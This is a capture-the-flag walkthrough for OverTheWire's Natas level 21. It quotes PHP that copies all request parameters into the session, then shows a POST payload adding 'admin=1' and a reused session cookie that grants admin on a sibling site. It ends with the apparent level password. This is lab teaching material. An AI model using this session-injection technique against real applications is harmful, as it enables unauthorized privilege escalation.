
# Solution
There is another site:
```html
**Note: this website is colocated with [http://natas21-experimenter.natas.labs.overthewire.org](http://natas21-experimenter.natas.labs.overthewire.org/)**
```

Same with Level20, The site is used to update color and store the values in an array in the session file:
```php
<?php  
  
session_start();  
  
// if update was submitted, store it  
if(array_key_exists("submit", $_REQUEST)) {  
    foreach($_REQUEST as $key => $val) {    $_SESSION[$key] = $val;  
    }  
}  
  
if(array_key_exists("debug", $_GET)) {  
    print "[DEBUG] Session contents:<br>";    print_r($_SESSION);  
}  
  
// only allow these keys  
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");  
$form = "";  
  
$form .= '<form action="index.php" method="POST">';  
foreach($validkeys as $key => $defval) {    $val = $defval;  
    if(array_key_exists($key, $_SESSION)) {    $val = $_SESSION[$key];  
    } else {    $_SESSION[$key] = $val;  
    }    $form .= "$key: <input name='$key' value='$val' /><br>";  
}  
$form .= '<input type="submit" name="submit" value="Update" />';  
$form .= '</form>';  
  
$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";  
$example = "<div style='$style'>Hello world!</div>";  
  
?>
```

```
[DEBUG] Session contents:  
Array ( [align] => center [fontsize] => 100% [bgcolor] => yellow )
```

However, there is only restriction to what value goes with what key. Not what key can be added.

Looking at the main page's code, we see:
```php
  
<?php  
  
function print_credentials() { /* {{{ */    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {  
    print "You are an admin. The credentials for the next level are:<br>";  
    print "<pre>Username: natas22\n";  
    print "Password: <censored></pre>";  
    } else {  
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";  
    }  
}  
/* }}} */  
  
session_start();  
print_credentials();  
  
?>
```

Meaning, we just need to add `admin=1` to the payload:
```
align=center&fontsize=100%25&okokok=yellow&admin=1&submit=Update
```

```
[DEBUG] Session contents:<br>Array
(
    [debug] => 
    [align] => center
    [fontsize] => 100%
    [okokok] => yellow
    [admin] => 1
    [submit] => Update
)
```

On the main site, we change the cookie to match the `experimenter`'s so that it loads the same array we just modified.

```
d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
```